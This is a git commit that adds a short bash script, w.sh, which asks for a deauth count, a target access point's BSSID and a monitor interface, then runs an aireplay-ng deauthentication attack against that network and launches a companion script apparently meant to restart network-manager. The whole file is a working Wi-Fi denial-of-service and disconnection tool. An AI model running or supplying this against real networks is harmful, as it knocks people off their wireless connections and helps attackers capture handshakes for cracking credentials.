9ab31c7f03f500be955aefdf92849c9d313509b7
CHAOSandORDER <50791518+CHAOSandORDER@users.noreply.github.com>
2019-05-19 03:13:50 -0400

    Add files via upload

---
+++ w.sh
@@ -0,0 +1,49 @@
+#!/bin/bash
+
+# wireless credentials
+iwconfig
+
+echo -n "
+
+Enter the no. of deauths :"
+
+read du
+
+read -p "Enter BSSID :" bs
+
+echo -n "Enter name of your wireless interface. E.g. for wlan0mon enter 0 :"
+
+read in
+
+# starts aireplay-ng
+
+if [ $in -eq 0 ]
+
+then
+
+	
+	aireplay-ng --deauth $du -a $bs wlan0mon
+	
+fi
+
+if [ $in -eq 1 ]
+
+then
+
+	
+	aireplay-ng --deauth $du -a $bs wlan1mon
+	
+fi
+
+if [ $in -eq 2 ]
+
+then
+
+
+	aireplay-ng --deauth $du -a $bs wlan2mon
+	
+fi
+
+#restarts network-manager
+
+gnome-terminal -- "./r.sh"
